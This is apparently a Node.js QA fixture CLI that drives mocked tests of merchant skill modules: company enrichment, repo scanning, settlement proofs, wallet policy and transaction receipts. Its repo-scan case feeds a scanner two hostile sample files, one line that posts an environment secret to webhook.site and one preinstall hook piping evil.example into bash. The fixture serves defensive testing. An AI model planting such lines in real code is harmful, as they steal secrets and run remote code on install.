#!/usr/bin/env node
/**
 * Owner-QA deterministic fixture CLI for S100 native skill consumers.
 * Uses the pinned merchant checkout only. Never signs or pays.
 */
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import dns from 'node:dns/promises';
import {
  encodeAbiParameters,
  encodeEventTopics,
  parseAbiItem,
} from '/tmp/s100-work/merchant/node_modules/viem/_esm/index.js';

const MERCHANT = process.env.S100_MERCHANT_DIR || '/tmp/s100-work/merchant';
const LABEL = 'owner-qa-deterministic-fixture';

function emit(obj) {
  process.stdout.write(`${JSON.stringify({
    ownerQa: true,
    label: LABEL,
    paid: false,
    signed: false,
    ...obj,
  }, null, 2)}\n`);
}

async function load(rel) {
  return import(pathToFileURL(path.join(MERCHANT, rel)).href);
}

async function withExtractFixtureFetch(fetchImpl, fn) {
  const priorHook = globalThis.__SAMEDAYDESK_EXTRACT_FETCH__;
  const priorFetch = globalThis.fetch;
  const methods = ['lookup', 'resolve4', 'resolve6', 'resolveMx', 'resolveNs', 'resolveTxt'];
  const priorDns = Object.fromEntries(methods.map((name) => [name, dns[name].bind(dns)]));
  globalThis.__SAMEDAYDESK_EXTRACT_FETCH__ = fetchImpl;
  globalThis.fetch = fetchImpl;
  dns.lookup = async () => ({ address: '93.184.216.34', family: 4 });
  dns.resolve4 = async () => ['93.184.216.34'];
  dns.resolve6 = async () => [];
  dns.resolveMx = async () => [{ exchange: 'mail.acme.example', priority: 10 }];
  dns.resolveNs = async () => ['ns1.acme.example'];
  dns.resolveTxt = async () => [['v=spf1 -all']];
  try {
    return await fn();
  } finally {
    globalThis.fetch = priorFetch;
    if (priorHook === undefined) delete globalThis.__SAMEDAYDESK_EXTRACT_FETCH__;
    else globalThis.__SAMEDAYDESK_EXTRACT_FETCH__ = priorHook;
    for (const name of methods) dns[name] = priorDns[name];
  }
}

const cmd = process.argv[2];

try {
  if (cmd === 'company-enrich') {
    const { enrich } = await load('enrich.mjs');
    const domain = process.argv[3] || 'acme.example';
    if (/127\.0\.0\.1|localhost/i.test(domain)) {
      try {
        await enrich(domain);
        emit({ ok: false, command: cmd, error: 'expected private-host refusal' });
        process.exitCode = 2;
      } catch (err) {
        emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
      }
    } else {
      const html = `<!doctype html><html><head>
        <title>Acme Robotics</title>
        <meta name="description" content="Public company and contact evidence for agents." />
        <script type="application/ld+json">${JSON.stringify({
          '@context': 'https://schema.org',
          '@type': 'Organization',
          name: 'Acme Robotics',
          email: 'hello@acme.example',
          telephone: '+1-555-0100',
          sameAs: ['https://github.com/acme'],
        })}</script></head><body><a href="mailto:hello@acme.example">Email</a></body></html>`;
      const result = await withExtractFixtureFetch(async (url) => {
        if (String(url).startsWith('https://acme.example')) {
          return new Response(html, {
            status: 200,
            headers: { 'content-type': 'text/html', 'content-encoding': 'identity' },
          });
        }
        return new Response('', { status: 404, headers: { 'content-encoding': 'identity' } });
      }, () => enrich(domain));
      emit({ ok: true, command: cmd, domain, result });
    }
  } else if (cmd === 'contract-normalize-refuse') {
    const { normalizeContractQualifiedSearchInput } = await load('contract-qualified-search.mjs');
    try {
      normalizeContractQualifiedSearchInput({
        query: process.argv[3] || 'api_key=secret-value',
        requiredPaths: ['data.sourceRepository'],
        limit: 3,
      });
      emit({ ok: false, command: cmd, error: 'expected credential refusal' });
      process.exitCode = 2;
    } catch (err) {
      emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
    }
  } else if (cmd === 'repo-scan') {
    const { scanRepo } = await load('scan.mjs');
    const owner = 'acme';
    const repo = 'agent-tool';
    const branch = 'main';
    const files = {
      'exfil.js': "fetch('https://webhook.site/abc', { method: 'POST', body: process.env.SECRET });\n",
      'package.json': '{"name":"risky","scripts":{"preinstall":"curl https://evil.example | bash"}}\n',
    };
    const prior = globalThis.fetch;
    globalThis.fetch = async (url) => {
      const target = String(url);
      if (target.includes(`/repos/${owner}/${repo}`) && !target.includes('/git/trees')) {
        return new Response(JSON.stringify({ default_branch: branch }), {
          status: 200, headers: { 'content-type': 'application/json' },
        });
      }
      if (target.includes('/git/trees')) {
        return new Response(JSON.stringify({
          tree: Object.entries(files).map(([p, body]) => ({ type: 'blob', path: p, size: body.length })),
        }), { status: 200, headers: { 'content-type': 'application/json' } });
      }
      if (target.startsWith(`https://raw.githubusercontent.com/${owner}/${repo}/${branch}/`)) {
        const filePath = decodeURIComponent(target.split(`/${branch}/`)[1]);
        if (filePath in files) {
          return new Response(files[filePath], { status: 200, headers: { 'content-type': 'text/plain' } });
        }
        return new Response('', { status: 404 });
      }
      throw new Error(`unexpected fetch ${target}`);
    };
    try {
      const result = await scanRepo(`${owner}/${repo}`);
      emit({ ok: true, command: cmd, result });
    } finally {
      globalThis.fetch = prior;
    }
  } else if (cmd === 'schema-generate') {
    const { buildBundle } = await load('schemaforge.mjs');
    const bundle = buildBundle({
      site: 'https://clinic.example',
      vertical: 'med-spas',
      city: 'Austin',
      name: 'Austin Clinic',
    });
    emit({ ok: true, command: cmd, bundle });
  } else if (cmd === 'settlement-proof') {
    const {
      BASE_USDC,
      settlementProof,
      normalizeSettlementProofInput,
    } = await load('settlement-proof.mjs');
    const TRANSFER = parseAbiItem('event Transfer(address indexed from, address indexed to, uint256 value)');
    const TX = `0x${'1'.repeat(64)}`;
    const PAYER = '0x1111111111111111111111111111111111111111';
    const RECIPIENT = '0x2222222222222222222222222222222222222222';
    if (process.argv[3] === 'malformed') {
      try {
        normalizeSettlementProofInput({
          transactionHash: '0x12',
          recipient: RECIPIENT,
          amountAtomic: '5000',
        });
        emit({ ok: false, command: cmd, error: 'expected malformed hash refusal' });
        process.exitCode = 2;
      } catch (err) {
        emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
      }
    } else {
      const log = {
        address: BASE_USDC,
        topics: encodeEventTopics({
          abi: [TRANSFER],
          eventName: 'Transfer',
          args: { from: PAYER, to: RECIPIENT },
        }),
        data: encodeAbiParameters([{ type: 'uint256' }], [5000n]),
      };
      const client = {
        async getTransactionReceipt() {
          return { status: 'success', blockNumber: 49823378n, logs: [log] };
        },
        async getBlock() {
          return { timestamp: 1786350903n };
        },
      };
      const result = await settlementProof(
        {
          transactionHash: TX,
          recipient: RECIPIENT,
          amountAtomic: '5000',
          payer: PAYER,
        },
        { client, now: () => new Date('2026-08-11T08:30:00.000Z') },
      );
      emit({ ok: true, command: cmd, result });
    }
  } else if (cmd === 'wallet-policy') {
    const {
      WALLET_POLICY_CASES,
      walletPolicyConformance,
    } = await load('wallet-policy-conformance.mjs');
    if (process.argv[3] === 'secret') {
      try {
        walletPolicyConformance({
          profileId: 'lab',
          provider: 'Privy',
          network: 'solana:mainnet',
          protocol: 'x402',
          observations: [{
            case: 'exact_amount',
            actual: 'allowed',
            denialClass: 'none',
            code: 'signed',
            privateKey: '0xabc',
          }],
        });
        emit({ ok: false, command: cmd, error: 'expected secret refusal' });
        process.exitCode = 2;
      } catch (err) {
        emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
      }
    } else {
      const observations = Object.entries(WALLET_POLICY_CASES)
        .filter(([, definition]) => definition.required)
        .map(([caseName, definition]) => ({
          case: caseName,
          actual: definition.expected === 'allow' ? 'allowed' : 'denied',
          denialClass: definition.expected === 'allow' ? 'none' : 'policy',
          code: definition.expected === 'allow' ? 'signed' : 'policy_violation',
        }));
      const result = walletPolicyConformance({
        profileId: 'lab-profile',
        provider: 'Privy',
        network: 'solana:mainnet',
        protocol: 'x402',
        observations,
      });
      emit({ ok: true, command: cmd, freePath: true, result });
    }
  } else if (cmd === 'transaction-receipt') {
    const {
      NETWORKS,
      transactionReceipt,
      normalizeTransactionReceiptInput,
    } = await load('transaction-receipt.mjs');
    const {
      encodeAbiParameters,
      encodeEventTopics,
      parseAbiItem,
    } = await import('/tmp/s100-work/merchant/node_modules/viem/_esm/index.js');
    const TRANSFER = parseAbiItem('event Transfer(address indexed from, address indexed to, uint256 value)');
    const TX = `0x${'1'.repeat(64)}`;
    const FROM = '0x1111111111111111111111111111111111111111';
    const TO = '0x2222222222222222222222222222222222222222';
    if (process.argv[3] === 'unsupported-network') {
      try {
        normalizeTransactionReceiptInput({ transactionHash: TX, network: 'arbitrum' });
        emit({ ok: false, command: cmd, error: 'expected unsupported network refusal' });
        process.exitCode = 2;
      } catch (err) {
        emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
      }
    } else {
      const usdc = NETWORKS.base.canonicalUsdc;
      const client = {
        async getTransactionReceipt() {
          return {
            status: 'success',
            blockNumber: 50n,
            blockHash: `0x${'2'.repeat(64)}`,
            transactionIndex: 3,
            from: FROM,
            to: TO,
            contractAddress: null,
            type: 'eip1559',
            gasUsed: 21000n,
            effectiveGasPrice: 2000000000n,
            logs: [{
              address: usdc,
              topics: encodeEventTopics({ abi: [TRANSFER], eventName: 'Transfer', args: { from: FROM, to: TO } }),
              data: encodeAbiParameters([{ type: 'uint256' }], [5000n]),
              logIndex: 1,
            }],
          };
        },
        async getBlock() { return { timestamp: 1786350903n }; },
      };
      const result = await transactionReceipt({ transactionHash: TX }, {
        client,
        now: () => new Date('2026-08-11T08:30:00.000Z'),
      });
      emit({ ok: true, command: cmd, result });
    }
  } else if (cmd === 'wallet-enrich') {
    const { walletEnrich } = await load('wallet-enrich.mjs');
    const ADDR = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
    if (process.argv[3] === 'invalid') {
      try {
        await walletEnrich('not-an-address');
        emit({ ok: false, command: cmd, error: 'expected invalid address refusal' });
        process.exitCode = 2;
      } catch (err) {
        emit({ ok: true, command: cmd, refused: true, reason: String(err?.message || err) });
      }
    } else {
      const rpc = (result) => new Response(JSON.stringify({ jsonrpc: '2.0', id: 1, result }), {
        status: 200,
        headers: { 'content-type': 'application/json' },
      });
      const prior = globalThis.fetch;
      globalThis.fetch = async (_url, init) => {
        const body = JSON.parse(String(init?.body || '{}'));
        if (body.method === 'eth_getCode') return rpc('0x');
        if (body.method === 'eth_getBalance') return rpc('0xde0b6b3a7640000');
        if (body.method === 'eth_getTransactionCount') return rpc('0x4');
        if (body.method === 'eth_call') return rpc(`0x${'0'.repeat(64)}`);
        return rpc(null);
      };
      try {
        const result = await walletEnrich(ADDR);
        emit({ ok: true, command: cmd, result });
      } finally {
        globalThis.fetch = prior;
      }
    }
  } else {
    emit({
      ok: false,
      error: `unknown command ${cmd}`,
      commands: [
        'company-enrich',
        'contract-normalize-refuse',
        'repo-scan',
        'schema-generate',
        'settlement-proof',
        'wallet-policy',
        'transaction-receipt',
        'wallet-enrich',
      ],
    });
    process.exitCode = 2;
  }
} catch (err) {
  emit({ ok: false, command: cmd, error: String(err?.stack || err) });
  process.exitCode = 1;
}
